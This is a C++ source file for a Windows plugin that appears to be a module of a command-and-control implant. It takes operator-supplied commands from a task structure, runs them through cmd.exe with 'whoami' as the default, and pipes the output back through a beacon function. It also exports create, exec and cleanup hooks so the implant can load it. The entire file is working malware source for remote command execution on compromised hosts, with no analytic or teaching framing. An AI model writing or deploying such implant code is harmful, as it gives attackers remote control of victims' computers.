#include <Windows.h>
#include <new>
#include "../../Include/IPlugin.h"

static DWORD RunCommand(const char* cmd, DWORD cmdLen, const WinApiTable* api = nullptr) {
    static const char kDefault[] = "whoami";
    if (!cmd || cmdLen == 0) {
        cmd    = kDefault;
        cmdLen = (DWORD)sizeof(kDefault) - 1;
    }

    SECURITY_ATTRIBUTES sa{};
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;

    HANDLE hRead = nullptr, hWrite = nullptr;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return GetLastError();
    SetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags    = STARTF_USESTDHANDLES;
    si.hStdInput  = GetStdHandle(STD_INPUT_HANDLE);
    si.hStdOutput = hWrite;
    si.hStdError  = hWrite;

    static const char kPrefix[] = "C:\\Windows\\System32\\cmd.exe /c ";
    const DWORD prefixLen = (DWORD)sizeof(kPrefix) - 1;
    const DWORD totalLen  = prefixLen + cmdLen;

    HANDLE heap = api ? api->GetProcessHeap() : GetProcessHeap();
    auto ha = api ? api->HeapAlloc : ::HeapAlloc;
    auto hf = api ? api->HeapFree  : ::HeapFree;
    char* full = (char*)ha(heap, 0, totalLen + 1);
    if (!full) {
        CloseHandle(hRead); CloseHandle(hWrite);
        return ERROR_OUTOFMEMORY;
    }
    CopyMemory(full, kPrefix, prefixLen);
    CopyMemory(full + prefixLen, cmd, cmdLen);
    full[totalLen] = '\0';

    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessA(nullptr, full, nullptr, nullptr,
                             TRUE, 0, nullptr, nullptr, &si, &pi);
    CloseHandle(hWrite);

    if (!ok) {
        DWORD le = GetLastError();
        hf(heap, 0, full);
        CloseHandle(hRead);
        return le;
    }

    BeaconPipeOutput(hRead);

    WaitForSingleObject(pi.hProcess, INFINITE);
    DWORD code = 0;
    GetExitCodeProcess(pi.hProcess, &code);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hRead);
    hf(heap, 0, full);
    return code;
}

class CmdPlugin : public IPlugin {
    const WinApiTable* m_api;
public:
    explicit CmdPlugin(const WinApiTable* api) : m_api(api) {}
    const WinApiTable* api() const { return m_api; }
    void init()    const override {}
    void cleanup() const override {}
    void execute(TaskApi* task) const override {
        RunCommand(task->Command, task->CommandLen, task->Api);
    }
};

static IPlugin* g_plugin = nullptr;
static const WinApiTable* g_api = nullptr;

extern "C" IPlugin* __stdcall create_plugin(const WinApiTable* api) {
    if (g_plugin) return g_plugin;
    g_api = api;
    HANDLE heap = api ? api->GetProcessHeap() : GetProcessHeap();
    auto alloc  = api ? api->HeapAlloc : ::HeapAlloc;
    void* mem = alloc(heap, HEAP_ZERO_MEMORY, sizeof(CmdPlugin));
    if (!mem) return nullptr;
    g_plugin = ::new (mem) CmdPlugin(api);
    return g_plugin;
}

extern "C" void __stdcall destroy_plugin(IPlugin* p) {
    if (!p) return;
    p->~IPlugin();
    HANDLE heap = g_api ? g_api->GetProcessHeap() : GetProcessHeap();
    auto free_fn = g_api ? g_api->HeapFree : ::HeapFree;
    free_fn(heap, 0, p);
    if (p == g_plugin) g_plugin = nullptr;
}

extern "C" void __stdcall plugin_init(IPlugin* p) {
    if (!p) p = create_plugin(g_api);
    if (p) p->init();
}

extern "C" void __stdcall plugin_exec(TaskApi* task) {
    if (!g_plugin) g_plugin = create_plugin(task->Api);
    if (g_plugin) g_plugin->execute(task);
}

extern "C" void __stdcall plugin_cleanup(IPlugin* p) {
    if (!p) p = g_plugin;
    if (p) p->cleanup();
}
